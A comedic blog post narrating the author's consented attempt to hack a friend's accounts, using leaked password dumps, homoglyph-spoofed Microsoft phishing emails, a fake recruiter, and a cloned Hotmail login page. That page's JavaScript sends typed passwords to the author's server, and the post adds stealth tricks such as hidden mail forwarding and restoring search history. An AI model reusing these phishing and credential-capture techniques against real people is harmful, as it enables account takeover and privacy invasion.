---
layout: post
title:  "Operation Luigi: How I hacked my friend without her noticing"
date:   2017-08-04 16:02:38 +1100
blurb: It's probably easier if you just read it. <a href="https://news.ycombinator.com/item?id=14919845">Salty Hacker News comments</a>
colour: pink
description: My friend gave me permission to hack her, here's how I did it and how to stop it happening to you.
permalink: /operation-luigi-how-i-hacked-my-friend-without-her-noticing
image: https://i.imgur.com/xgqR3Ss.png
---

![intro](https://i.imgur.com/xgqR3Ss.png)

Hello and welcome to a blog post. I am writing it and you are reading it. It's amazing what we can do with computers these days.

# Several months ago

I'm at a ramen place with my friend Diana. Diana isn't her real name, but we're going to pretend it is because that's what all the cool journalists do and I wanna fit in too so don't ruin this for me okay.

I ask her if it would be okay for me to try and hack all her stuff. She's instantly visibly excited. I explain how this could result in me seeing everything she's ever put on a computer ever. She tells me she thinks this is going to be "so good". We lay down some rules:

* I'll start some time in the next 12 months
* No deleting anything she has
* No disrupting her daily life
* Stop asking if she's sure it's okay

_Bonus rule from me: Do this entire thing in stealth mode. Don't ever let Diana know that I've started until it's too late._

I mean, *obviously* it worked since you and I are having this nice little textual discourse right now. Take my hand metaphorically, and I'll guide you through what I tried, my many flubs[^flubs], and how to protect yourself from what I did[^fate].

And uh also at the end Mario's green friend is there.

[^fate]: Obviously the best way is to not give permission to meeeeeeeee😎

[^flubs]: A careless mistake

# Part 1: Research
## """Open Source Intelligence Gathering""""" AKA googling furiously and pretending you went to uni for this

Alright uh I'm pretty sure the first thing you do when you're hacking someone is find all their personal information. I'm talking about her email, phone number, address, star sign, whether she uses Android or Windows Phone, her birthday, and so on.

## Jeez we're gonna need to know her email address aren't we?
People put lots of their information on LinkedIn (an *information landscape* that connects your inbox to people you met once in a bar and will forever file under "misc") because it tells them to.

The first thing I see on Diana's LinkedIn[^findinglinkedin] is her email address. I hastily put on my black hoodie and get my arms a bit stuck in the sleeves. Hacker voice I'm _in_[^hackervoice]. Immediately I sigh and put my hands on my temples like a stressed-out banker. It's a @hotmail.com address, which surprises me since, well, who's using Hotmail in the year of our lord 2017? I mean geez if you used hotmail you'd miss out on gmail's excellent security features heyoooo

     [x] email address
     [ ] the respect of my peers


[^findinglinkedin]: I found her LinkedIn by just googling her name #pwned
[^hackervoice]: wait did he just say "hacker voice I'm in"?

### Does she use this email for Twitter?

![twitterpw](https://i.imgur.com/mQs1pgB.png)

Yep.

### How about her phone number?

I type a bunch of extremely clumsy things into Google. I'm talkin' "dianalastname@hotmail.com phone". A matrix of what looks like zeroes and ones but is actually Google search results flies down my screen at about the speed a normal person would scroll at.

There's a sign-up page for a club she started at her university. The page says "Contact Diana Lastname at dianalastname@hotmail.com or [her phone number]". pew pew got 'em.

    [x] email
    [x] phone number
    [ ] the respect of my peers

### Storing the goods

I paste all these things into a Google Doc - an advanced NSA hacking tool leaked in the recent Shadow Brokers incident.

While googling securely, I find an old blog of hers from 2009. It has a search box. I immediately slam "pet", "cat" and, "dog" in that search box like it's 2009. The name of someone's pet is often somehow involved in their security, either as their password or as a "Security""" question or something. I find the name of her dog from 2009 and vigorously paste it into my Google Doc.


## Let's try getting into her iCloud account

Armed with my weapons-grade Google Doc, I'm ready to have a go at trying to get into something of Diana's[^haventrealised].

I don't really have a good reason for going after iCloud, so if you could just give me a break for *one second*

If I click "Forgot Apple ID?" on iCloud, by entering Diana's full name and email address, Apple tells me her Apple ID, and my screen permanently changes to green-on-black text to suit my new lifestyle.

I'm clicking around and there's a section called "account recovery". Sure, I'll have a go.

I can recover the account by clicking "I've uh lost my phone and forgot my password AND locked out of my email". Apple says "okay you colossal bozo, fine, but give us a phone number you CAN access, and we'll SMS you instructions to get back into your account". If I was in a movie doing _~crimes~_ then I'd use a burner phone number. But since this is just my friend, I use my real phone number. I get an SMS from Apple being like "We received your request and will get back to you within 4 to 6 *business millennia*. Our *Neo-Future Customer Service Representatives* will contact your *next-of-kin* by whatever means of communication is prevalent at the time."

There's another "account recovery" option that says "use a device you already have". I click this, hoping to get a list of Diana's Apple devices. Instead it gives me this:

![flubs](https://i.imgur.com/dQmdZUM.png)

Daaaaaaaaaaaaaaaammmmit.

I have taken the wrong path in this text adventure game.

I've just notified Diana that someone's trying to reset her account.

For me that would set off all kinds of alarm bells and I'd start furiously investigating what's going on with all my accounts because I'm very cool and collected. But I'm just going to hope that Diana is a normal human being who is _not_ obsessively paranoid like me and just ignores all of those pesky automated emails from Apple and Microsoft being like "blah blah account blah" or "blah blah new sign in blah" because I mean who _really_ has time for those we've all got places to go and phones to scroll I mean _reallY_ who's gonna pay attention to _one liTtlE email_ when there's a whole OCEAN of low quality memes to scroll past on Facebook? I mean _wouldn't you rather_ see some nice political memes? Newsfeed alert: Some guy from high school has just been tagged in- _oh wow lOok_ this one's about your local government, _wowee_ they've even managed to use the meme font while standing their ground and writing all the text as though it's a trying-to-sound-formal letter from your school principal who is still desperately trying to combat cyberbullying using nothing but stern words and beginning every sentence with "In regards to...."

There's no way for me to know if she saw the notification, so I stop rolling around on the floor whispering about low quality memes and get back to work.

[^haventrealised]: I haven't realised yet that successfully resetting Diana's iCloud password would lock her out of her account and violate our agreement. This is because I'm a weapons-grade bozo.

## Several days later

My phone rings. I can feel the vibration in my pocket and I'm like "is someone _calling_ me here in the year of our lord 2017 I can't believe this". I don't recognise the number.

"Hello?"

"Hi, who am I talking to?"

"It's uh Alex."

"Alex?"

"Yeah."

"Alex ``?"

"Uh, noooo it's-"

"Ohhhhhhhhhhhhh."

"Wait so who am _I_ talking to?"

It's Diana.

"What's up?", I ask.

She explains to me how she got an email from Apple about her account and there was a phone number in it. I tug my collar several meters into the next room, knocking over several carefully-potted indoor plants.

I hit pause on this whole thing, immediately own up, and say "yep, that was me, no need to worry, and I didn't get anywhere, your iCloud account is safe and s- WAIT a minute are you telling me you got an email from Apple saying someone tried to reset your account, realised it wasn't you, saw the phone number, and then CALLED it? What was your plan if some hacker answered??"

She didn't have a plan. She just called it as soon as she saw it, the _absolutely_ off-the-rails lunatic.

We have a nice chat and agree to hang out later. She asks me if I've "hacked her already", and I say "no comment" to preserve my so-far flawless operational security.

Before I hang up, I wanna show off my work so far.

"Hey Diana, one more thing"

"Yeah?"

"Check it out. Did you ever play a game called........ Fashion Fantasy Beach?"[^fantasybeach], I say, coolly and relatably.

[^fantasybeach]: On haveibeenpwned.com, Diana's email address shows up in a data dump from this website. It's a game of some sort?

Diana freaks out and starts laughing. She's forgotten about this game and me reminding her of her account brings back good memories.

"Can you like, find all the accounts I had on all those game websites?"

Sweet young Diana. If only it worked that way. Hacking can only be used for stealing government secrets and ransoming bitcoins. It's just not that simple.

"By the way, just checking, it's still okay for me to try and hack all your stuff right?"
"SO okay"

# Part 2: Hackinggggg

At this point I could reset Diana's password for some services by answering her "Security""" Questions with all the information I've gathered.

But, I realise, far too late and to the live studio audience's disappointment, that would violate the "don't interfere with her daily life" part of our deal. If I reset her password, this will lock her out of whatever account I reset. So, I have to get access stealthily.
This will uh heavily involve _knowing_ her password rather than resetting it.

For a long time I consider doing the renaissance-era "send 'em a word doc with a macro in it to get control of their computer then submit to defcon" but I worry that sweet young millennials like Diana don't even use Word because they do everything on their phone or Google Docs while simultaneously consuming 17.28 avocados per second *look it up*.[^googledocs]

[^googledocs]: Later when I interview Diana, she says "I use exclusively Google Docs", so I was right! No comment about the avocado thing.

I guess that makes the most valuable thing in her life her email. If you remember earlier, I cunningly divined her email address in Part 1, so I'm basically halfway there.
If I get her email, I can just reset her password for Facebook, Twitter, Fashion Fantasy Beach, etc.
My cyber attack vector cyber entry point exploit would then be _typing the password into the Hotmail login screen using the Google Chrome Web Browsing Software_.


## The shady password market

Alright listen we're about to go into password paradise so buckle whatever it is you normally buckle.
Hackers right, they hack websites. Hoo boy they just love to pop those hypertext pages. Like Dropbox, MySpace, LinkedIn, Adobe, Tumblr, and many, many more. They try to steal everyone's username and password from these sites by making a copy of the database and taking it. Sometimes, the database of usernames and passwords they steal gets released on the ~_dark web_~, for free or for money.
Conveniently, there's a website (https://haveibeenpwned.com) which lets you type in your email address (_not_ your password you big bozo) and find out whether any of your passwords have appeared in these leaked stolen databases.

But.... nowhere does it say you have to type in _your_ email address. Cunningly, I type dianalastname@hotmail.com, executing hacking.

![hibp](https://i.imgur.com/Uh13Flz.png)
![hibp2](https://i.imgur.com/TuR0lfl.png)

Here we can see a couple of websites Diana has accounts on have been hacked. The only one which had passwords stolen for Diana was Tumblr. So the next goal is to _acquire_ the Tumblr database leak from 2013.

### Let's get the old Tumblr database

I try to use my ~hacker connections~ to get a copy of the Tumblr database. I meet a someone whose forum handle is like d4rkrayne or whatever in a local park at 11pm. A colossal vape cloud leads me to him, waiting under a tree, puffing furiously. I look down my 1987 mirror-tinted aviators and say "how much?" (my voice comes out several octaves lower and all grizzly like a 40-year-old generic white dude movie star with like, juuust the right amount of stubble). He sells me the database on a pile of 442 floppy disks for 5,000 credits. What a ripoff. I teleport behind him, say "nothin' personal, kid", and hoverboard-kickflip into the night.

...I download the Tumblr database from a publicly accessible, unauthenticated, absolutely non-dark web website. I scramble to get back in my black hoodie, and whip on a second pair of sunglasses over the first. I'm _in_.

## Ancient forbidden password rituals

The Tumblr database dump - a hacking Quest Item - is one long file with lines that look like this:

```
coolrelateabledude123@gmail.com:3a1920ceb2791d034973c899907847cb58810808
```

That weird thing after the email is a password hash. A password hash is like a scrambled up version of the password. You can't unscramble it. If you know the password though, you can scramble it and get the same omlette, *if ya know what I'm sayin'*🍳.

My goal here is to figure out what Diana's *actual* password is, given that I have her password hash. This process is commonly known as "hacking".

These particular passwords are not just hashed, but also salted[^salted]. This means that before each password is hashed, the good folks at Tumblr added an extra bit of text to the end of each one. So instead of hashing, say, `cooldad64`, they'd hash `cooldad64HNc62V8`.

[^salted]: I'm not making these up, these are real words that real hackers use I swear.

## Finding the salt

There's no official information on what kind of hashes are in `Tumblr.txt`.

The fully sick attack I want to do is: hashing a big list of passwords I *just happen to have lying around wow* and checking if any of the hashes match Diana's password hash. This is called a "dictionary attack", because the person who invented it was actually a dictionary. The trouble is, you need to know the salt to do this.

I google around some more, bask in the glory of _very_ poorly constructed sentences on some *~hacker forums~*, and ask my _~hacker connections~_ in an attempt to find out what the salt is.

But I can't find it because fun fact I'm a total fraud.

## Can I get the password... without the salt?

So remember how Tumblr salted the passwords by sticking some random stuff on the end to thwart wannabees like me?

The trouble is.... They stick the same thing (in my example, `HNc62V8`) on the end of _every_ password. This isn't considered the best practice here in the year of our lord 2017, because it means that users with the same password have the same password hash.
The emails and passwords would look like this:

```
markjohnson64@email.com:cooldad64HNc62V8
chicago.tony1@email.com:cooldad64HNc62V8
patriotsfan69@email.com:p@triots69HNc62V8
iamsherlocked.ravenclaw@email.com:Bongo1HNc62V8
```

I search `Tumblr.txt` for not `dianalastname@hotmail.com`, but for her password hash. (`3a1920ceb2791d034973c899907847cb58810808`)

I find more than **20 Tumblr users with the same password** as Diana aw yeah

```
[REDACTED]@email.com:3a1920ceb2791d0...
[REDACTED]@email.com:3a1920ceb2791d0…
[REDACTED]@email.com:3a1920ceb2791d0…
[REDACTED]@email.com:3a1920ceb2791d0…
```

This makes me think that Diana's password is probably not very unique, since all these other Dr. Who enthusiasts on Tumblr have also thought of it.

But _also_. Now I've got 20 other email addresses with the same password as Diana. Thanks to the miracle of everyone using the same password for everything, I've got a way to find Diana's password.

I *just so happen AGAIN WOW WHATTA GUY* to have the LinkedIn database dump from when LinkedIn was 360 whirlwind slam [hacked](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) in 2012[^nolinkedin].

Why do I care about the dump from the LinkedIn hack, you ask, fatigued from many gags and desperate for the part where we actually hack Diana?

LinkedIn also hashed their passwords in 2012, but they didn't add that freshly ground pink Himalayan rock salt to them. Also, the password hashing method they used is cripplingly insecure[^insecure] (SHA1 for all you extremely online people out there). Because of these flubs, most (>97%) of the passwords in the LinkedIn dump are available _in plain text, not even hashed at all_ thanks to the hard work and GPU cycle donations of people in the password cracking community.

[^insecure]: tag urself lol

I get the 20-ish Tumblr emails who have the same Tumblr password as Diana, and look *them* all up in the LinkedIn dump. They're not all in there, but good enough baybee.

```

[REDACTED]@email.com:qwerty1

[REDACTED]@email.com:killer6

[REDACTED]@email.com:qwerty1

[REDACTED]@email.com:qwerty1
```

More than 80% of them have the same LinkedIn password. (Which we will say is `qwerty1`.)

This has *gotta* be Diana's password from Tumblr in 2013. Since all these people had the same password on Tumblr, and most of them have the password `qwerty1` on LinkedIn, it's very likely that Diana's Tumblr password is `qwerty1`.

I try to log in to her Hotmail account with the password `qwerty1`.

"Incorrect password"

[^nolinkedin]: Diana didn't have LinkedIn in 2012, so she's not in the list. But some of the 20 people who had the same password as her sure did.

## Wait please this was supposed to be easy please no why is it like this don't do this to me

Oh *come on* I was supposed to be hacking a _normal person_ who uses the same password for everything this isn't fAiR. There are entire criminal [industries](https://www.owasp.org/index.php/Credential_stuffing) built on the idea that people use the same password all over the place because _nobody cares enough to remember more than a few passwords_ because they've *got things to scroll on their phone* okay.

Somehow, Diana is one of the _rare few people_ who is not a security expert but has _more than one_ password for her stuff.

I try this password on a few of her other accounts (Facebook, Twitter, iCloud) and it works on _none_ of them[^passwordguessing].

[^passwordguessing]: I also try guessing what her password could be based on the password I already have for her (`qwerty1`) but it doesn't work.

On Facebook, I'm conveniently informed that this password *was* her password 5 months ago, but isn't any more.

![fbpassword](https://i.imgur.com/S6nK5tL.png)

Looks like I just missed out. The plot thickens audibly.

This was supposed to be the part where I say "and then I logged into her email 100% stealthily", equip my third consecutive pair of sunglasses, and move on to the next bit. But alas, Diana was only in one leaked password list on `haveibeenpwned.com` at the time, so there goes that.

Fiiiiiiiiiiine whatever I don't even care I'm not crying, you're crying. Time to do this the old fashioned way. And by "the old fashioned way" I of course mean "the way government hackers do it".

# Part 3: Hackinggggg (again)

## Social engineering

Alright so we're just going to trick her into telling me her password.
Is that cheating? Basically. But *absolutely* I'm going to do it anyway.

To get into her email, I need to *know* Diana's email password. Resetting the password won't work (since that would interrupt her life by locking her out of her email). I don't really wanna follow her around, man-in-the-middle attack her phone or laptop when it connects to insecure WiFi and steal her browser session, so that leaves us with: phishing.

You may have heard of "phishing", the process of emailing someone and tricking them into doing something, like giving you their password.

Now, hold up bucko, you're probably thinking of the kind of phish where someone says "good day sir I nigerian prince give you $1 million dollars USD u are royalty 2 me" etc. etc.

Or maybe you're thinking of someone sending an email that says "[heavy breathing] pls clikc on my urls [http://click.here.to.get.ripped.in.three.weeks.verylegit.link/6x9M;PjxrY=WrS33n$Hcracked__767windows8+bitcoin.gpg.exe](http://click.here.to.get.ripped.in.three.weeks.verylegit.link/6x9M;PjxrY=WrS33n$Hcracked__767windows8+bitcoin.gpg.exe)"

But with nothing more than paperclips, chewing gum, a single fidget spinner, and an advanced psychology degree, we can not only steal Diana's password, but do it without Diana realising she's been tricked.

## Hand-crafting artisanal phishing emails to sell at the Sunday markets

Let's write down what we want to do:

* Get Diana's email password
* Don't let her realise that the email is not legit

Hmm I guess there were only two dot points uhh sorry that doesn't seem worth having dot points at all ummmm

So anYwAy the trick to phishing is that you don't want to engage the victim's attention. You want them to interact with your email mindlessly, without thinking it's a big deal. Kinda like how you click through email notifcations from Twitter (or anything that sends you email notifications) without really thinking about the email, because you're thinking about what awaits on the other end.

The _other_ way, rather than distracting the victim, is to misdirect them. You give them something that's _way_ more interesting to pay attention to than your dodgy link. Common examples of this include emails that say "OMG your account has been HACKED, log in here to fix it".

But of course, you log in to a fake website which steals your password.

Wow actually that sounds pretty[^pretty] easy[^easy] doesn't it? Let's try that then.

[^pretty]: low
[^easy]: effort

I'll make an email that says "Your Microsoft Account Has Been Hacked And Uh If You Don't Log In Now It Will Get Deleted So Uh Yeah You Better Log In".

Instead of designing my own legit-looking Microsoft email, it's easier to just copy one that Microsoft has already made. I search _my_ hotmail account[^myhotmail] for an automated email from Microsoft.

[^myhotmail]: From 2002 do NOT @ me

I use the incredibly cutting edge "Inspect Element" feature of the popular hacking software, Google Chrome, to edit the text of the email but keep the look.
As I right click and hover over "Inspect Element", my laptop instantly explodes, I get root access to Microsoft, I'm added 50 times to every NSA watchlist, my text permanently changes to green-on-black, and I'm accepted to DEFCON.

Now it looks like this:

![microphish](https://i.imgur.com/kv9nALW.png)

I can't send the email from my email account, because I'm not a *total amateur*. I use the popular hacking tool The Microsoft Sign Up Screen to make the hotmail account "msftacountteam@outlook.com". If you look closely, "account" is spelled wrong. I used "msft" because it wouldn't let me include the word "microsoft".

I try to register an account with first name "Microsoft" and last name "Account Team". The signup form doesn't let me. Blast. Thwarted by Microsoft lackeys. Probably, Microsoft doesn't let you have "Microsoft" in your account name to prevent, uh, exactly what I'm doing.  Hmmm. I don't really want to have a typo in the name, like "Micorsoft", since Diana might notice that.

Instead I, a level 8 Wizard, cast a spell to swap the "o" characters in "Microsoft" for a special unicode character (like an emoji but much worse) that looks exactly like an "o". It's not, of course, it's our old friend, the Greek letter ["Omicron"](https://en.wikipedia.org/wiki/Omicron). Here's the two pals side-by side:

οo

Awww, just look at 'em having a blast.
These little guys might look different in the font your device is using, but in the hotmail web UI font they look juuuust right👌.

So now, my account's name isn't "Microsoft", It's "Micr`[omicron]`s`[omicron]`ft", according to the code that checks whether you have a valid name when you sign up for an account.

I'm sure you're wondering how this whole process ends up with me getting Diana's password, laughing manically in my comically giant leather chair. After she clicks the link in my legit looking email, she'll be asked to log in[^loggedin]. The page she goes to will look just like the Hotmail login page, but it will _really_ be a copy that sends the password to me.

[^loggedin]: This makes *no sense*, since she'll be reading her Hotmail, and then asked to log in to *the same thing she's already reading*, but NON-fake websites have bad enough UX that this is believable.

How can I make such a page? Well I'll clone the real page, register a domain that looks similar to `login.live.com`, host my cloned page there, and so on.
Juuust kidding, the static website hosting service [Aerobatic](aerobatic.io) happens to also be an _excellent_ phishing service.

I can register `[anything].aerobatic.io`, and deploy my static HTML to that domain with their command line tool for free.

Shout outs to Aerobatic for the smooth smooth phishing UX. Use the referral code DIANA to be immediately reported to the NSA.

I copy the existing `login.live.com` page, and pre-fill `dianalastname@hotmail.com` in the "email address" field. I deploy this page extremely trivially to `login-live.aerobatic.io`, and equip my fourth pair of sunglasses (don't worry I've earned it). This _almost_ looks right, but the real Hotmail login form has a bunch of stuff after the `/` in the URL, so I copy/paste some of that good stuff too[^goodstuff].

[^goodstuff]: I steal all that good stuff after the URL from the Google sign-in page `;>_>`

Here's the exact URL, if you're interested. Also if you're not interested. It's gonna be there either way.

```
https://login-live.aerobatic.io/?passive=1209600&continue=https%3A%2F%2Faccounts.live.com%2FManageAccount&followup=https%3A%2F%2Faccounts.live.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin
```

![Screenshot of login page](https://i.imgur.com/aZJoeYA.png)


Perfect[^loginscreen]. This looks similar enough to fool a cursory glance, and that's all we need baybee. Maybe she'll think "why do I have to log in again? I'm already logged in to my email?", but the email asks for a "Secure Login" (whatever that is).

[^loginscreen]: Awkwardly, Hotmail changed its login screen shortly before this blog post came out. It *used* to look like that I swear.

Here's what the login page does:

    // When the Login button is clicked or Enter is pressed
    $('#passwordForm').on('submit', function() {
        var password = $('#password').val();

        // Create an image with a URL that points to my website.
        // The browser will request this URL in an attempt to load the image (which will fail since that URL doesn't exist)
        $('body').append('<img src="a-website-i-own.com/DIANA?'%20+%20password%20+%20'" alt="image">');

        // Wait one second to simulate loading time (adjust to 0.1s if you don't live in Australia sigh), and then go to the real Hotmail login page.
        // Diana will already be logged in, so this will seem to her exactly like she's just logged in to hotmail.
        window.setTimeout(function() {
            window.location = 'login.live.com'
        }, 1000);
        return false;
    }


This works by sending her password to me when she clicks "log in". The password is sent a website of mine. Then I send her along to the real Hotmail, so it looks just liked she logged in.
The website logs everything that gets sent to it, so I can then search my logs for "DIANA" to find the log containing the password.

This is all what I'm hoping for, anyway. The email says she has 48 hours to comply to create time pressure. Telling you that you have to do something _right now_ is a common tactic to make you think instinctively and irrationally.

I login to my fake "Microsoft Account Team" hotmail account, send the email to dianalastname@hotmail.com and wait for her to have herself a red-hot browse.

About 12 hours later, I check my logs to see if she's typed her password.

She doesn't.

I wait another 12 hours.

Still nothing.

I send the email again, wincing slightly, this time saying she has 24 hours.

Still nothing.

## Well damn
I guess that didn't work.
She must have just ignored the email as uninteresting[^attention]

[^attention]: There are a few reasons this email wasn't attention grabbing. It was automated, from a company (not an actual human), and wasn't specifically about her, but about her account.

I try to think of non-phishing ways to get her password but really phishing is just _too good_. The nice thing about being the attacker is that you can put your eggs in many baskets. Diana has to defend against _all_ of my eggs, and I've got baskets _for days_. Time for round 2.

## Sniper scope targeted phishing blap blap

I reach under my desk, unwrap a parcel addressed to "DIRECTOR OF CYBER, NSA", slide out a yellow and black canister labelled "CHINA", break open the safety seal, and use safety tongs to extract the following red-hot phish.

This time, instead of using a generic idea that would work on anyone ("suspicious account activity"), we'll make something special just for Diana. Kinda like hand-knitting a beanie, but comparatively less wholesome.

I Google "google docs microsoft equivalent" and come across I dunno SkyDrive or SkyDocs 365 Pro or something or OneDrive look I dunno just look it's Google Docs but Microsoft so good enough for me.

I make a convincing looking resume (in Google Docs, of course) and copy it into a OneSkyCloudDrive 364/2 Days: Final Remix HD+ Doc.

## Let's play: who's gonna send this doc to Diana?

I find a local company that's likely to legitimately want to talk to Diana, and search for a recruiter who works there on LinkedIn. I make someone with the same first name, but a different last name as a real recruiter from this company[^lookupthecompany].

I make a fake gmail account called Kathleen Wheeler, using a stock photo of a middle-aged western woman as the profile photo.

Here's what Kathleen is going to email Diana.

![email screenshot](https://i.imgur.com/McUFzCO.png)

Looks legit riiiight?

The questions at the end are just some garbage I made up, but the point of them is to distract Diana right after she reads the "click here".

I put Diana's real phone number at the end to make it more convincing. This email is obviously meant *just* for her. It also makes sense for the phone number to be there, since presumably whoever listed Diana as a referee gave the phone number to Kathleen.

[^lookupthecompany]: When I interview her later, Diana says she looked up the company! She even says that getting back to Kathleen was on her to-do list, the poor thing.

At the time she types her password, we want Diana to be thinking of what's on the other side of the login screen.

The delicious bait here is that this email says "someone said they know you", and you have to read the resume to find out who. Aw, but the resume is behind a pesky link. ~_Guess you better just click on it_~. LinkedIn also does this in their, um, "engagement" emails which say things like "you have 2 new messages", but not who they're from or what they say.

When Diana clicks on the link to the "resume", it will take her to the same fake login page (with her email pre-filled) as before. When she types anything in the password box, the site will wait one second and then send her to the Microsoft Google Doc™. The one-second wait is to simulate Australian internet speeds HAHAHAHAhahahahahah this sucks

She'll find that she doesn't know the person, probably because they're completely made up. They have work experience at real workplaces nearby, and went to the same university as Diana at around the same time, so hopefully their resume passes a cursory glance[^glance].

Finding an unfamiliar resume is a sufficient, but not particularly satisfying conclusion to the adventure of the weird email from Kathleen. But of course, by then it's too late, I'm sitting in my ivory tower *surrounded* by passwords.

I make sure to send it during business hours, from "Kathleen""", pull a necklace from under my shirt dramatically, kiss it, look up at the sky, and wait.

[^glance]: Months later, I notice I've left a "Lorem ipsum dolor sit amet, consectetur adipiscing elit" as a dot point on the resume.

## Waiting
That night, I check my website's logs for any passwords from my fake Hotmail login form.

```
- - [[date]:16:32:30 +1000] "GET /DIANA?qwerty1 HTTP/1.1" 404 4702 "https://login-live.aerobatic.io/?passive=1209600&continue=https%3A%2F%2Faccounts.live.com%2FManageAccount&followup=http...." "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1"
```

"Got it!"

..... is what I think, at first.

Particularly keen readers will have noticed that the password Diana has typed into my fake Hotmail login page is... the same password as we found for her in the Tumblr database.

This is *not* her Hotmail password, and everything is terrible.

From this we can draw two conclusions:

* Diana **doesn't know** what her Hotmail password is
* She now *thinks* her hotmail password is `qwerty1`, since she typed it into my fake login page which accepts *any password*, and it worked

I almost gave up at this point, but a last-minute burst of desperation/frustration/final destination helped me work up the courage to have another shot here in Act 3.

By this point my fake Microsoft Account Team email account has been soft-banned by the good people at William Gates Inc. for sending so many obvious phishing emails. I have to prove I'm a human and add my phone number to the account, and then it unlocks and I can edit the Microsoft Google Doc.

I *hastily* make a new fake resume of *significantly* lower quality than the first one, and make a crucial change to my fake login page.

My fake login page now says "wrong password" *no matter what* you type in the first two times you try typing something. If you type `qwerty1`, then the password counter doesn't go up[^suggestion].

[^suggestion]: This is a genius suggestion from one of my [~_hacker connections_~](https://twitter.com/GracieNoLag).

What do people do when they get a "wrong password" error? Try *all* of the 3 or 4 passwords they use for everything, of course.

I want to try and get Diana to type `qwerty1`, get a "wrong password" error, and then just unload all her passwords into my form.

Diana replied to my failed email with "sorry I don't know this person", and so Kathleen replies with, "wrong resume lol, here's the new one" even though this makes zero sense in the context of our email exchange. I'm hoping Diana will just be busily checking the email on her phone and not really notice this discrepancy.

![Dianareply1](https://i.imgur.com/H6QEW3d.png)

![oopswrongresume](https://i.imgur.com/H8TlvtC.png)

I use a different font from the "form" when typing as Kathleen to make it look like this is a form that gets copy/pasted to every candidate. This makes Kathleen seem like she does this all the time in her big bustling, 100% real office. I also do my best to imitate the tone of a polite but stressed out office worker. You can almost *hear* the office politics. It's called *method acting*.

Time to stressfully wait for Diana to check for her email again, so now would be a good time to read out some donations.

## Hours later

It works.

```

108.162.249.169 - - [12/May/2017:13:39:43 +1000] "GET /DIANA?wertyu2 HTTP/1.1" 404 4702 
"https://docs-login-live.aerobatic.io/?passive=1209600&continue=https%3A%2F%2Faccounts.live.com%2FManageAccount&followup=https%3A%2F%2Faccounts.live.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin" 
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1"


```

I get only one password from Diana (typed multiple times), but it's different to the last one I got (`qwerty1`)[^gaslighted].

I wait until she's asleep based on her [Facebook Messenger last active time](https://defaultnamehere.tumblr.com/post/139351766005/graphing-when-your-facebook-friends-are-awake) and log into her email using the elite hacking method of typing her password into the box.

The reason I waited until she was asleep was in case Hotmail emailed the account saying "New Sign In". It doesn't, and I'm rewarded with her email inbox screen in its full glory.

![emailscreenshot](https://i.imgur.com/BIfr6BE.png)

Angels sing softly above me. A small yellow bird lands on my shoulder and begins to chirp softly. I get several emails from the bullies in high school - they're really sorry and they've done a lot of soul searching and they want to make it up to me and I should expect premium fruit baskets on my doorstep in the coming months. Global warming halts.

[^gaslighted]: At this point Diana has been completely gaslighted as to what her hotmail password is, because my phishing site said the wrong password was right, and then said the right password was wrong, and she thinks it's the real Hotmail.

## "But that would never work on me"

It would tho.

Perhaps some of you in the audience are thinking "Wow, this Diana person must be pretty dumb to fall for that. Good thing I'm a web browsing *prodigy* with a colossal brain and many opinions, so that would never happen to me."

The thing is, right now you're very alert, because you're reading a blog post about hacking. If you were just reading your email, half-paying-attention on a train as normal, security wouldn't likely be on your mind. If sending trick emails is good enough for whoever [the NSA](https://www.washingtonpost.com/world/hospitals-across-england-report-it-failure-amid-suspected-major-cyber-attack/2017/05/12/84e3dc5e-3723-11e7-b373-418f6849a004_story.html), are emailing, then it's probably good enough to work on you and me.

I guess what I'm saying here is "don't go shaming phishing victims plz".

Anyway sorry back to **haͅck͐i̥n̏g̜**

# Part 4: HACKER VOICE I'M IN

I immediately try Diana's email password (`wertyu2`) on her Facebook, Twitter, LinkedIn, iCloud, and on her other email addresses. None of them work because I've chosen someone with *slightly* above average personal security to target.

The obvious next step is to forward all her email to me (so I don't have to keep logging in to her email). Before I set up email forwarding, I try it out on a hotmail account I control. I'm testing to see if setting up "forward all your email to this address" sets off any notifications I'll have to delete, or notifies you in any other way.

In gmail, when you forward all your mail to another email address, the other address gets emailed a code, and also a big red bar appears on your gmail inbox saying "you're sending literally all of your email to this address FYI" for 7 days.

I type in my email address into my test hotmail account, and click "forward all my mail here pls". It saves. I check both email inboxes for a notification email. There isn't one. I've just backdoored this email account and no fuss has been made whatsoever. OH well at least hotmail has NoMansSkyDrive 2.8 Remastered XL Online or whatever.

![emailforwarding](https://i.imgur.com/aZJoeYA.png)

## An interlude from Diana
Diana replies to my email saying she doesn't know this person either. She's a little suspicious, so I try and say something that will close the conversation.

![dianasuspicious](https://i.imgur.com/dO95Qmp.png)
![kathreply2](https://i.imgur.com/dq6xzfl.png)

Diana doesn't reply.

## Hey remember how you can search email?

Now that I have Diana's email password, I want to search her email for more passwords, and use those passwords to get more, and so on, like a REAL hacker.

Try going to your email and searching for "password". Betcha there's passwords in there.

In Hotmail, when you go to search something, the last 5 searches you've done pop up as suggestions.

![searchhistory](https://i.imgur.com/pGuxFuj.png)

This means that if I search for "password", Diana will notice "password" in the search history. That would be a really lame way to get caught.

To get around this, I:
* Wait until Diana is asleep
* Write down her last 5 searches
* Search for "password"
* Look at the results
* Search for her last 5 searches again, in reverse order

Since *only* the last 5 searches are shown, by repeating the searches in reverse order, the search history looks exactly the same.

Much to the disappointment of the live studio audience, I don't find anything particularly useful. I find the two passwords I already know (`qwerty1` and `wertyu2`) several times, and one other password which I again try on all her accounts, but doesn't work `</3`.

I hang out in Diana's email for several months. Every so often I check it.
I find her signing a contract for a job, and so I get her passport number, signature, phone number, bank account number, and basically everything I'd need to impersonate her. I don't really[^gov1][^gov2][^gov3] want to impersonate someone's government-issued ID, so I leave this alone.

[^gov1]: I mean it WOULD be pretty funny
[^gov2]: And wow you could do anything, book flights, get a job, change your name...
[^gov3]: Just letting any Government Agents reading this know that I did NOT end up doing anything with this and I love democracy.

At one stage, I'm browsing through hit political discourse platform and opinion conveyor belt twitter dot com, and I notice Diana tweet something along the lines of "Finally spent my day off consolidating my 4 email accounts into 1, feels good to be organised".

